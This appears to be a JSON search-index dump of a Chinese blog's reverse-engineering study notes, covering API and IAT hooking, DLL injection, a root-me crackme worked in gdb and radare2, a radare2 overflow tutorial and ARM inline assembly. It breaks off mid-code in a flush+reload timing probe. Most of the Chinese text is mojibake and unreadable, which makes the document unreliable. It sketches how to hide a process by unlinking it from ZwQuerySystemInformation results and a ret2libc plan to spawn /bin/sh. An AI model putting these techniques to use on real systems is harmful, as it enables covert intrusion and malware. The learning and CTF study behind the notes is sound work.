é€‰æ‹©å¤´ä¸­IATè¡¨æ˜çš„åœ°å€ä¸­ ç›¸åº”æ²¡æœ‰å†™æƒé™ä¹Ÿæ²¡äº‹ INTå’ŒIATæŒ‡å‘å†…å®¹æœ‰æ—¶ç›¸åŒ è¡¨ç¤ºåœ°å€è‚¯å®šä¸åŒ å› ä¸ºä¿å­˜åœ¨ä¸åŒåœ°å€ æ‰€æŒ‡å†…å®¹ç›¸åŒ","text":"INT å’Œ IATINT æ˜¯rvaæ•°ç»„ï¼ŒINTè¡¨ç¤ºæ•°ç»„é¦–åœ°å€ æ•°ç»„å…ƒç´ æ˜¯ä¸€ä¸ªåœ°å€ æŒ‡å‘ç”±ä¸€ä¸ª2å­—èŠ‚ordinallåœ°å€å’Œå‡½æ•°åç§°ç»„æˆçš„ç»“æ„ä½“ ç¬¬ä¸€ä¸ªå€¼åœ°å€æŒ‡å‘ç¬¬ä¸€ä¸ªç»“æ„ä½“ å¦‚æœIATå­˜åœ¨äº é€‰æ‹©å¤´ä¸­IATè¡¨æ˜çš„åœ°å€ä¸­ ç›¸åº”æ²¡æœ‰å†™æƒé™ä¹Ÿæ²¡äº‹ INTå’ŒIATæŒ‡å‘å†…å®¹æœ‰æ—¶ç›¸åŒ è¡¨ç¤ºåœ°å€è‚¯å®šä¸åŒ å› ä¸ºä¿å­˜åœ¨ä¸åŒåœ°å€ æ‰€æŒ‡å†…å®¹ç›¸åŒ è¿›ç¨‹å†…å­˜è½¬å‚¨OLLYGDBæ’ä»¶ï¼Ÿï¼Ÿ dumpå‘½ä»¤æ˜¯è§£å‹ç¼©è¿è¡Œæ—¶ï¼Œå°†å†…å­˜è½¬ä¸ºæ–‡ä»¶ï¼Œæ–¹ä¾¿æŸ¥çœ‹ ä»£ç æ³¨å…¥ä½¿ç”¨CALLæŒ‡ä»¤å°†æ¥ä¸‹æ¥çš„åœ¨ä»£ç é—´çš„å­—ç¬¦ä¸²æ•°æ®åœ°å€å‹å…¥æ ˆï¼Œç„¶åç›´æ¥æ¥ä¸‹æ¥è¿è¡Œå‘½ä»¤ CALL EAXEAXä¿å­˜å‡½æ•°åœ°å€32ä½ä¿å­˜è¿”å›å†…å®¹ top å‘½ä»¤ (linux)æŸ¥çœ‹ CPU æ—¶é—´åœ¨ User space ä¸ Kernel Space ä¹‹é—´çš„åˆ†é…æƒ…å†µ SEHé“¾ollydbg VIEW-SEH CHAIN APIé’©å–windows ä¸­å†…æ ¸æ¨¡å¼æ‰€æœ‰ä»£ç å…±ç”¨ä¸€ä¸ªè™šæ‹Ÿç©ºé—´åœ°å€ï¼Œç”¨APIä¼ e1 = 9Fh =&gt; 0fh*2^7 = 780h ä½¿ç”¨å¸¸è§„ç³»ç»Ÿèµ„æºçš„APIä¼šç»ç”±kernel32.dllå’Œntdll.dllä¸æ–­å‘ä¸‹è°ƒç”¨ï¼Œæœ€åç»ç”±SYSENTERå‘½ä»¤è¿›å…¥å†…æ ¸æ¨¡å¼ åŠ¨æ€æ–¹æ³•å¸¸ç”¨ è°ƒè¯•å’Œæ³¨å…¥æ–¹æ³•1ï¼šè°ƒè¯•å¼‚å¸¸å¿…é¡»å¤„ç†ä¸ºEXCEPTION_BREAKPOINT æ±‡ç¼–æŒ‡ä»¤ä¸ºint 3 IA-32æŒ‡ä»¤ä¸º0xCC ç”¨å¼‚å¸¸è·å–APIçš„æ§åˆ¶ çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼Œï¼ˆæ‰§è¡Œå®Œä¸€ä¸ªçº¿ç¨‹æ—¶é—´ç‰‡ï¼Œæ‰§è¡Œå¦ä¸€ä¸ªï¼‰ï¼Œä¹Ÿå°±æ˜¯å„ä¸ªå¯„å­˜å™¨ä¿¡æ¯ï¼Œä¿å­˜åœ¨CONTEXTç»“æ„ä½“ä¸­ã€‚ CONTEXT.esp apié’©å– è·å–æŸä¸ªAPIçš„æ§åˆ¶æƒ æ–¹æ³•2ï¼šDLLæ³¨å…¥setwindowstextA è¡¨ç¤ºASCIIsetwindowstextW è¡¨ç¤ºå®½å­—ç¬¦ winä¸­ä¸ºUnicodeç  IATé’©å–é€šè¿‡æ³¨å…¥DLLï¼Œä¿®æ”¹IATä¸­æŒ‡å‘æŸAPIçš„åœ°å€æ”¹ä¸ºæŒ‡å‘è‡ªå·±APIçš„åœ°å€ï¼Œè‡ªå·±çš„å‡½æ•°å†å»è°ƒç”¨æŸAPIï¼Œæ¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ æœç´¢APIåœ¨ç”¨ollydngè¿›è¡Œå†…éƒ¨æ¨¡å—call æœç´¢æ—¶ï¼Œå…ˆé€‰å–å¯¹çš„æ¨¡å—ã€‚å³é”®-select moudleåœ¨ç”¨ollydbg ä¸­search for nameå‘½ä»¤ APIä»£ç ä¿®æ”¹å°†APIå¤´äº”ä¸ªå­—èŠ‚ ä¿®æ”¹ ä¸ºJMP XXXXXXXXå³è·³è½¬åˆ°æ³¨å…¥çš„å‡½æ•°ä¸­ é€šè¿‡å°†ntdll.ZwQuerySystemInformation() å‡½æ•°å½¢æˆçš„é“¾è¡¨ä¸­åˆ é™¤è¿›ç¨‹ä¿¡æ¯å³å¯åšåˆ°éšè—ç›¸å…³è¿›ç¨‹ã€‚ å…¨å±€APIé’©å–é€šè¿‡ä¿®æ”¹ntdll.ZwResumeThread() API çƒ­è¡¥ä¸ hot patchä¿®æ”¹7å­—èŠ‚ä»£ç 1.äºŒæ¬¡è·³è½¬ä¸¤å­—èŠ‚è·³åˆ°æŒ‡ä»¤ä¸Šé¢ï¼Œç”¨äº”å­—èŠ‚è·³åˆ°è‡ªå·±çš„å‡½æ•°åœ°å€2.ä¸ç”¨è„±é’©ï¼Œåœ°å€+2å­—èŠ‚ï¼Œå°±å¯æ­£å¸¸è¿è¡Œ ia-32 E9 è¡¨ç¤ºfar jmp äº”å­—èŠ‚ã€‚E9 XXXXXXXX=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰ EB è¡¨ç¤º short jmp ä¸¤å­—èŠ‚ä¾æ‰˜å½“å‰EIP åœ¨-128~127èŒƒå›´é—´è·³è½¬XX=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ2ï¼‰","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ch25.bin","slug":"ch25bin","date":"2020-10-05T11:13:34.000Z","updated":"2020-10-05T11:14:23.029Z","comments":true,"path":"2020/10/05/ch25bin/","link":"","permalink":"http://finsenty54.github.io/2020/10/05/ch25bin/","excerpt":"é€†å‘ root_mech25.binhttps://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en","text":"é€†å‘ root_mech25.binhttps://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en è¯†åˆ«C++ç±»å¦‚ä½•è¯†åˆ«è½¯ä»¶æ˜¯ç”¨C++æ‰€å†™ï¼Ÿ1 é¢‘ç¹ä½¿ç”¨ECX ä¿å­˜this æŒ‡é’ˆ ï¼ŒæŒ‡å‘ç±»å¯¹è±¡ï¼Œå¦‚åœ¨è°ƒç”¨å‡½æ•°å‰2 è™šå‡½æ•° è¦å…ˆçŸ¥é“ç±»è™šå‡½æ•°è¡¨ï¼Œç„¶åå¾—åˆ°å®é™…å€¼ï¼Œä¹Ÿæ˜¯ä¼ åˆ°ECXä¸­3 ä½¿ç”¨STL code å¯ç”¨IDA importsæŸ¥çœ‹ ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨æ¯ä¸ªå˜é‡å››å­—èŠ‚ä¸è¶³è¦å¯¹é½å†…å­˜ä¸­æ’åˆ—ä¸å®šä¹‰ç›¸åŒ è™šå‡½æ•°è¡¨è¦åœ¨æœ€å¼€å¤´è¡¨åŒ…å«è™šå‡½æ•°åœ°å€ï¼ŒæŒ‰å®šä¹‰æ’åº å¦‚æœç»§æ‰¿å¦ä¸€ä¸ªç±» ç»§æ‰¿å¤šä¸ªç±»è™šè¡¨æŒ‰é¡ºåºæ’åº è¯†åˆ«ç±»1 è¯†åˆ«æ„å»ºå’Œæ’¤é”€1.1 å…¨å±€å˜é‡åœ¨ç¼–è¯‘æ—¶ ä¿å­˜åˆ°ï¼ˆPEï¼‰æ–‡ä»¶çš„æ•°æ®æ®µæ„å»ºåœ¨main()å‰è°ƒç”¨ ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain()é—´ï¼Œç¡®å®šä¸ºæ„å»º1.2å±€éƒ¨å˜é‡æŒ‡é’ˆæŒ‡å‘æœªåˆå§‹åŒ–çš„æ ˆå˜é‡ 1.3åŠ¨æ€åˆ†é…å˜é‡ new(ï¼‰å †ä¸Šåˆ†é… 2å¤šæ€ç±»è¯†åˆ«2.1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚RTTICompleteObjectLocator pointer TypeDescriptoræŒ‡å‘çš„ç»“æ„åŒ…å«ç±»å RTTIClassHierarchyDescriptor RTTIBaseClassDescriptor vftablevbtable (virtual base class table) æŒ‡ä»¤E9æŒ‡ä»¤E9ç›¸å¯¹å¯»å€e9 xxxxxxxxxxxxxxxx=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰e9 00 00 00 00 å³è·³è½¬åˆ°ä¸‹ä¸€ä¸ªåœ°å€402005-402000-5=000000 æŒ‡ä»¤EBEBè¡¨ç¤ºshort jmpå‘½ä»¤ï¼Œè¿›è¡ŒçŸ­è·ç¦»è·³è½¬eb xx æŒ‡ä»¤setneset if not equalsetne clif ZF=1 then cl=0if ZF=0 then cl=1 strings å‘½ä»¤display printable strings in [file(s)] (stdin by default) ç ´è§£æ–¹æ³•11234567891011121314$ gdb ./ch25.bin (gdb) set args toto //è®¾ç½®è¾“å…¥å‚æ•°toto(gdb) b main //åœ¨mainè®¾ç½®æ–­ç‚¹Breakpoint 1 at 0x8048a95 (gdb) r //è¿è¡Œç¨‹åºï¼ˆåˆ°æ–­ç‚¹ï¼‰Breakpoint 1, 0x08048a95 in main ()(gdb)disass //æ˜¾ç¤ºæ±‡ç¼–ä»£ç (gdb) b *main+268gdb)c ç»§ç»­æ‰§è¡Œ(gdb) layout prev å¯ä»¥æŸ¥çœ‹å †æ ˆå’Œæ±‡ç¼–ä»£ç (gdb) x/1xw $eaxâ€œ x / 1xw $ eaxå‘½ä»¤åœ¨EAXå¯„å­˜å™¨ä¸­åŒ…å«çš„åœ°å€å¤„æ˜¾ç¤º1ä¸ªåå…­è¿›åˆ¶æ ¼å¼çš„16ä½å­—(gdb) x/1s 0X08050b24æŸ¥çœ‹è¯¥åœ°å€å€¼ ç ´è§£æ–¹æ³•2radare2 ç±»ä¼¼IDA1234r2 ch25.binaaa //åˆ†æå‡½æ•°ï¼Œå‚æ•°...VV @main //ä½¿ç”¨ VV è¿›å…¥ å›¾å½¢åŒ–æ¨¡å¼ï¼ˆéœ€è¦æ˜¯å‡½æ•°èŒƒå›´å†…ï¼‰ã€‚pdf @ main //åˆ†æåå°±å¯ä»¥æ­£å¸¸æ‰“å°å‡½æ•°ä»£ç äº†ï¼ˆpdf æ‰“å°å‡½æ•°ä»£ç ï¼‰ pedaæ˜¯GDBçš„ä¸€ä¸ªæ’ä»¶https://github.com/longld/peda gdb-peda$ run jlkd å¸¦å‚æ•°è¿è¡Œ","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"é€†å‘ å­¦ä¹ r2 part2","slug":"é€†å‘å­¦ä¹ r2part2","date":"2020-09-27T11:19:49.000Z","updated":"2020-09-27T11:20:33.245Z","comments":true,"path":"2020/09/27/é€†å‘å­¦ä¹ r2part2/","link":"","permalink":"http://finsenty54.github.io/2020/09/27/é€†å‘å­¦ä¹ r2part2/","excerpt":"é€†å‘ å­¦ä¹ r2 part2https://www.megabeets.net/a-journey-into-radare-2-part-2/ åœ¨NXå’ŒASLRçš„ä¿æŠ¤ä¸‹","text":"é€†å‘ å­¦ä¹ r2 part2https://www.megabeets.net/a-journey-into-radare-2-part-2/ åœ¨NXå’ŒASLRçš„ä¿æŠ¤ä¸‹ $ r2 -d megabeets_0x2-d â€“ Open in the debug modeaas â€“ Analyze functions, symbols and more dcu address Continue until address VV pdf @ sym.beet ragg2ragg2, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.å®ƒå…è®¸æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªç§°ä¸ºDe Bruijn Sequenceçš„å¾ªç¯æ¨¡å¼ï¼Œå¹¶æ£€æŸ¥æœ‰æ•ˆè½½è·è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡åç§»é‡ -P [size] prepend debruijn pattern -q [fragment] debruijn pattern offset -r show raw bytes instead of hexpairs $ ragg2 -P 100 -rä¹‹å‰SEHæ”»å‡» åº”è¯¥æœ‰ç”¨è¿‡ rarun2rarun2ç”¨ä½œå¯åŠ¨å™¨ï¼Œç”¨äºè¿è¡Œå…·æœ‰ä¸åŒç¯å¢ƒï¼Œå‚æ•°ï¼Œæƒé™ï¼Œç›®å½•çš„ç¨‹åºï¼Œå¹¶è¦†ç›–é»˜è®¤æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚stdinï¼‰ã€‚å½“æ‚¨å¿…é¡»ä½¿ç”¨é•¿å‚æ•°è¿è¡Œç¨‹åºï¼Œå°†å¤§é‡æ•°æ®ä¼ é€’ç»™stdinæˆ–ç±»ä¼¼çš„ä¸œè¥¿æ—¶ï¼Œè¿™å¾ˆæœ‰ç”¨ï¼Œè¿™é€šå¸¸æ˜¯åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µã€‚ $ ragg2 -P 200 -r &gt; pattern.txt $ cat pattern.txt $ vim profile.rr2 $ cat profile.rr2 #!/usr/bin/rarun2 stdin=./pattern.txt $ r2 -r profile.rr2 -d megabeets_0x2-r [rarun2] specify rarun2 profile to load (same as -e dbg.profile=X)-d debug the executable â€˜fileâ€™ or running process â€˜pidâ€™ ä¿¡å·æ˜¯å‘é€åˆ°åŒä¸€è¿›ç¨‹ä¸­çš„æŸä¸ªè¿›ç¨‹æˆ–ç‰¹å®šçº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œä»¥ä¾¿å°†å‘ç”Ÿçš„äº‹ä»¶é€šçŸ¥ç»™å®ƒã€‚Â·å½“SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åšå‡ºæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜å¼•ç”¨æˆ–åˆ†æ®µé”™è¯¯æ—¶ï¼Œå³åœ¨æ‰§è¡Œåˆ†æ®µè¿è§„æ—¶ï¼Œå°†å…¶å‘é€åˆ°è¿›ç¨‹ã€‚ wopO value Finds the given value into a De Bruijn Pattern at current offset | dr Show â€˜gprâ€™ registerswopO dr eipæ²¡æœ‰æˆåŠŸwopO 0x41417641 i Get info from opened file (see rabin2â€™s manpage)ii Importsiip æ›´ç®€æ˜ The plan Leak the real address of puts Calculate the base address of libc Calculate the address of system Find an address in libc that contains the string /bin/sh Call system with /bin/sh and spawn a shell è¿‡ç¨‹é“¾æ¥è¡¨Procedure Linkage Tableï¼ˆPLT)æ˜¯ä¸€ä¸ªå†…å­˜ç»“æ„ï¼Œå…¶ä¸­åŒ…å«å¤–éƒ¨åŠŸèƒ½çš„ä»£ç å­˜æ ¹ï¼Œè¿™äº›å‡½æ•°çš„åœ°å€åœ¨é“¾æ¥æ—¶æ˜¯æœªçŸ¥çš„ã€‚Â·æ¯å½“æˆ‘ä»¬åœ¨.textæ®µä¸­çœ‹åˆ°å¯¹å‡½æ•°çš„CALLæŒ‡ä»¤æ—¶ï¼Œéƒ½ä¸ä¼šç›´æ¥è°ƒç”¨è¯¥å‡½æ•°ã€‚Â·ç›¸åï¼Œå®ƒåœ¨PLTå¤„è°ƒç”¨å­˜æ ¹ä»£ç ï¼Œä¾‹å¦‚func_name @ pltã€‚ç„¶åï¼Œå­˜æ ¹è·³è½¬åˆ°å…¨å±€åç§»è¡¨ï¼ˆGOTï¼‰ä¸­ä¸ºæ­¤åŠŸèƒ½åˆ—å‡ºçš„åœ°å€ã€‚å¦‚æœå®ƒæ˜¯æ­¤åŠŸèƒ½çš„ç¬¬ä¸€ä¸ªCALLï¼Œåˆ™GOTæ¡ç›®å°†æŒ‡å‘PLTï¼Œåè€…å°†è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ï¼Œè¯¥é“¾æ¥å™¨å°†è§£ææ‰€éœ€åŠŸèƒ½çš„å®é™…åœ°å€ä¸‹æ¬¡è°ƒç”¨func_name @ pltæ—¶ï¼Œå­˜æ ¹ç›´æ¥ä»GOTè·å–åŠŸèƒ½åœ°å€ã€‚((å°‘äº†åŠ¨æ€é“¾æ¥æ­¥éª¤ï¼Ÿï¼Ÿ)) pwntoolsæ¼æ´åˆ©ç”¨æ¡†æ¶ ~ character is radareâ€™s internal grep [0xf7763b30]&gt; # the address of puts@plt: [0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num] # Show value 0x08048390 [0xf7763b30]&gt; ?v reloc.puts syæŒ‰tabé”®è‡ªåŠ¨æœå¯» Usage: dmi # List/Load Symbols All these paddr=0x000xxxxx are the offsets of the function from libc base. ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨radareçš„æœç´¢åŠŸèƒ½ã€‚Â·é»˜è®¤æƒ…å†µä¸‹ï¼Œradareæ­£åœ¨dbg.mapä¸­æœç´¢ï¼Œè¿™æ˜¯å½“å‰çš„å†…å­˜æ˜ å°„ã€‚Â·æˆ‘ä»¬è¦æœç´¢æ‰€æœ‰å†…å­˜æ˜ å°„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œé…ç½®ï¼š[0x080483d0]&gt; e search.in = dbg.mapsè¦ä»¥å¯è§†æ–¹å¼é…ç½®é›·è¾¾ï¼Œè¯·ä½¿ç”¨Ve Usage: /[!bf] [arg] Search stuff dmm List modules of target process [0x080483d0]&gt; ?X 0xf7700768-0xf7599000","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"å­¦ä¹ r2","slug":"å­¦ä¹ r2","date":"2020-09-24T08:29:04.000Z","updated":"2020-09-24T08:30:03.440Z","comments":true,"path":"2020/09/24/å­¦ä¹ r2/","link":"","permalink":"http://finsenty54.github.io/2020/09/24/å­¦ä¹ r2/","excerpt":"é€†å‘ å­¦ä¹ r2RABIN2 â€” Binary program info extractor$ rabin2 -I megabeets_0x1 stripped falseæ²¡æœ‰å‰¥ç¦»ç¬¦å·è¡¨static false //æ‰€ä»¥æ˜¯åŠ¨æ€é“¾æ¥","text":"é€†å‘ å­¦ä¹ r2RABIN2 â€” Binary program info extractor$ rabin2 -I megabeets_0x1 stripped falseæ²¡æœ‰å‰¥ç¦»ç¬¦å·è¡¨static false //æ‰€ä»¥æ˜¯åŠ¨æ€é“¾æ¥ r2 //radare2ie[0x08048370]&gt; ie ie å‘½ä»¤å¯ä»¥æ‰“å°å‡ºç¨‹åºçš„å…¥å£ç‚¹ ?åœ¨ä»»ä½•ä¸€ä¸ªå‘½ä»¤åé¢æ·»åŠ  ? æ¥è·å¾—æ›´å¤šçš„å­å‘½ä»¤ä¿¡æ¯ï¼š [0x08048370]&gt; i? aaä½¿ç”¨ â€˜aaâ€™ å‘½ä»¤æ¥åˆ†ææ–‡ä»¶ [0x08048370]&gt; a? aa?aaa[?] autoname functions after aa (see afna) flagflag æ˜¯æ‰€æœ‰ç±»ä¼¼ç‰¹å¾çš„é›†åˆï¼Œå±•ç¤ºæ‰€æœ‰çš„ flag ï¼Œç”¨ â€˜fsâ€™ å‘½ä»¤ [0x08048370]&gt; fs f f list flags (will only list flags from selected flagspaces [0x08048370]&gt; fs imports; f iziz â€“ åˆ—å‡ºæ•°æ®æ®µé‡Œçš„å­—ç¬¦ä¸² axt[0x08048370]&gt; axt @@ str.* axt [addr] find data/code references to this address @@ # foreach iterator command: x| x @@ sym.* run â€˜xâ€™ over all flags matching â€˜sym.â€™ in current flagspace ss # Help for the seek commands. See ?$? to see all variables aflaf?ç”¨ â€˜aflâ€™ æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤ä»£è¡¨ç€åˆ†æå‡½æ•°åˆ—è¡¨ï¼ˆAnalyze Functions Listï¼‰. pdfs mainç”¨ â€˜pdfâ€™ï¼ˆè¾“å‡ºåæ±‡ç¼–ä»£ç ï¼‰ mm å¯ä»¥ç”¨æ¥æ ‡è®°ç‰¹å®šçš„åç§»åœ°å€ï¼Œä¹‹åè¾“å…¥å¯¹åº”çš„keyå°±å¯ä»¥è·³è½¬åˆ°ä½ è®¾ç½®çš„åœ°æ–¹. VV è§†å›¾æ¨¡å¼shell é‡Œè¾“å…¥ VVæ¥è¿›å…¥å›¾å½¢æ¨¡å¼ f sym. æ¥å®šä½å‡º sym.beet å‡½æ•°pdf @ sym.beet å‘½ä»¤ï¼Œâ€˜@â€™ è¡¨ç¤ºä¸´æ—¶æŸ¥æ‰¾å¯è§†è§†å›¾ç•Œé¢ç›´æ¥è·³è½¬åˆ° beet å‡½æ•°ä¸Šé¢è¯´è¿‡çš„æ–¹æ¡†ä¸­çš„æ•°å­—å—ï¼Ÿè¿™é‡Œç›´æ¥æŒ‰ 3 å°±å¯ä»¥äº† gd å‘½ä»¤ï¼Œd å°±æ˜¯æ¯ä¸€ä¸ªè·³è½¬æˆ–è€…è°ƒç”¨ä»£ç æ—è¾¹çš„ å­—æ¯ ahi:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7ahi s set base to string (1)ahi s æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦ä¸²ç‰¹å®šçš„åç§»åœ°å€@@æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå¯ä»¥ç”¨æ¥æ¥å—åé¢è¾“å…¥çš„å¤šä¸ªå‚æ•°,æ‰§è¡Œå®Œè¿™æ¡å‘½ä»¤å rr å›¾å½¢æ¨¡å¼åˆ·æ–° rahash2rahash2 åŒ…å«å¾ˆå¤šç§ç®—æ³•æ¥æ±‚è¯ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å­—ç¬¦ä¸²çš„æ ¡éªŒå€¼,å…·ä½“çš„ç”¨æ³•è¯·ä½¿ç”¨ â€˜man rahash2 â€˜. 00oo reopen current fileood [args] # reopen in debug mode (with args) dcdc Execution continuation commands| dc Continue execution of all children","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ARMå†…è”æ±‡ç¼–","slug":"ARMå†…è”æ±‡ç¼–","date":"2020-09-24T00:34:38.000Z","updated":"2020-09-24T00:41:34.491Z","comments":true,"path":"2020/09/24/ARMå†…è”æ±‡ç¼–/","link":"","permalink":"http://finsenty54.github.io/2020/09/24/ARMå†…è”æ±‡ç¼–/","excerpt":"gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†é¢„å¤„ç†define ç¼–è¯‘é¢„å¤„ç†æ—¶ï¼Œå¯¹ç¨‹åºä¸­æ‰€æœ‰å‡ºç°çš„â€œå®åâ€ï¼Œéƒ½ç”¨å®å®šä¹‰ä¸­çš„å­—ç¬¦ä¸²å»ä»£æ¢ #å¼€å¤´éƒ½æ˜¯é¢„ç¼–è¯‘æŒ‡ä»¤","text":"gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†é¢„å¤„ç†define ç¼–è¯‘é¢„å¤„ç†æ—¶ï¼Œå¯¹ç¨‹åºä¸­æ‰€æœ‰å‡ºç°çš„â€œå®åâ€ï¼Œéƒ½ç”¨å®å®šä¹‰ä¸­çš„å­—ç¬¦ä¸²å»ä»£æ¢ #å¼€å¤´éƒ½æ˜¯é¢„ç¼–è¯‘æŒ‡ä»¤ #ifndef HEADER_FILE #define HEADER_FILE the entire header file file #endif è¿™ç§ç»“æ„å°±æ˜¯é€šå¸¸æ‰€è¯´çš„åŒ…è£…å™¨ #ifndefã€‚å½“å†æ¬¡å¼•ç”¨å¤´æ–‡ä»¶æ—¶ï¼Œæ¡ä»¶ä¸ºå‡ï¼Œå› ä¸º HEADER_FILE å·²å®šä¹‰ã€‚æ­¤æ—¶ï¼Œé¢„å¤„ç†å™¨ä¼šè·³è¿‡æ–‡ä»¶çš„æ•´ä¸ªå†…å®¹ï¼Œç¼–è¯‘å™¨ä¼šå¿½ç•¥å®ƒã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ typedef ä¸ºä¸€ä¸ªå·²æœ‰çš„ç±»å‹å–ä¸€ä¸ªæ–°çš„åå­—ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨ typedef å®šä¹‰ä¸€ä¸ªæ–°ç±»å‹çš„è¯­æ³•ï¼š typedef struct config *config_t; //å°†config* é‡æ–°å®šä¸º config_t typedef type newname; ARMå†…è”æ±‡ç¼–GCCç¼–è¯‘å™¨æ”¯æŒç›´æ¥åœ¨Cæˆ–è€…C++ä»£ç ä¸­ï¼ŒåµŒå…¥ARMæ±‡ç¼–ä»£ç ã€‚å…¶åŸºæœ¬æ ¼å¼éå¸¸ç®€å•ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š __asm__ [__volatile__] ( assembler template : [output operand list] /* optional */ : [input operand list] /* optional */ : [clobbered register list] /* optional */ ); æ¯ä¸€ä¸ªæ“ä½œæ•°ç”±ä¸‹åˆ—ç»„æˆ [name]&quot;[modifier]constraint&quot;(C expression) name è¡¨ç¤ºåˆ«å é™å®šç¬¦constraint &quot;aâ€å°†è¾“å…¥å˜é‡æ”¾å…¥eax &quot;bâ€å°†è¾“å…¥å˜é‡æ”¾å…¥ebx â€œcâ€å°†è¾“å…¥å˜é‡æ”¾å…¥ecx â€œdâ€å°†è¾“å…¥å˜é‡æ”¾å…¥edx â€œsâ€å°†è¾“å…¥å˜é‡æ”¾å…¥esi â€œdâ€å°†è¾“å…¥å˜é‡æ”¾å…¥edi GCCä¸­å®šä¹‰äº†ä¸‰ä¸ªä¿®æ”¹ç¬¦modifierï¼Œåˆ†åˆ«æ˜¯ï¼šä¿®æ”¹ç¬¦ å«ä¹‰ = åªå†™æ“ä½œæ•°ï¼Œé€šå¸¸ç”¨äºè¾“å‡ºæ“ä½œæ•°ä¸­ + å¯è¯»ä¸”å¯å†™æ“ä½œæ•°ï¼Œå¿…é¡»è¦åˆ—åœ¨è¾“å‡ºæ“ä½œæ•°ä¸­ &amp; å¯„å­˜å™¨åªèƒ½ç”¨äºè¾“å‡º ç¼–è¯‘å™¨å¹¶ä¸ä¼šåˆ†æä½ çš„æ±‡ç¼–ä»£ç ï¼Œæ‰¾å‡ºè¿™ç§è¢«ä½ ä¿®æ”¹è¿‡ï¼Œéœ€è¦æ¢å¤çš„å¯„å­˜å™¨ï¼Œå› æ­¤ä½ å¿…é¡»æ˜¾å¼çš„å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¢«ä½ ä¿®æ”¹è¿‡çš„å¯„å­˜å™¨æœ‰å“ªäº›ã€‚è¿™å°±æ˜¯ä¿®æ”¹å¯„å­˜å™¨åˆ—è¡¨æ‰€èµ·åˆ°çš„ä½œç”¨ã€‚clobbered register list ç¤ºä¾‹__flush and reload/*SFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨SFENCEæŒ‡ä»¤ä¹‹å‰çš„å†™æ“ä½œä½†æ˜¯ä¸å½±å“è¯»æ“ä½œã€‚ LFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨SFENCEæŒ‡ä»¤ä¹‹å‰çš„è¯»æ“ä½œä½†æ˜¯ä¸å½±å“å†™æ“ä½œã€‚ MFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨MFENCEæŒ‡ä»¤ä¹‹å‰çš„è¯»å†™æ“ä½œã€‚ sfence:åœ¨sfenceæŒ‡ä»¤å‰çš„å†™æ“ä½œå½“å¿…é¡»åœ¨sfenceæŒ‡ä»¤åçš„å†™æ“ä½œå‰å®Œæˆã€‚ lfenceï¼šåœ¨lfenceæŒ‡ä»¤å‰çš„è¯»æ“ä½œå½“å¿…é¡»åœ¨lfenceæŒ‡ä»¤åçš„è¯»æ“ä½œå‰å®Œæˆã€‚ no instruction fol-lowing it executes before thelfenceinstruction mfenceï¼šåœ¨mfenceæŒ‡ä»¤å‰çš„è¯»å†™æ“ä½œå½“å¿…é¡»åœ¨mfenceæŒ‡ä»¤åçš„è¯»å†™æ“ä½œå‰å®Œæˆã€‚ */ 123456789101112131415161718192021222324252627unsigned long gettime() &#123; volatile unsigned long tl; asm __volatile__(\"lfence\\nrdtsc\" : \"=a\" (tl): : \"%edx\"); //â€œ__volatile__â€å…³é”®å­—ï¼Œè¿™ä¸ªæ˜¯å¯é€‰çš„ï¼Œ //å…¶ä½œç”¨æ˜¯ç¦æ­¢ç¼–è¯‘å™¨å¯¹åé¢ç¼–å†™çš„æ±‡ç¼–æŒ‡ä»¤å†è¿›è¡Œä¼˜åŒ– return tl;&#125;int probe(char *adrs) &#123; volatile unsigned long time; //gcc 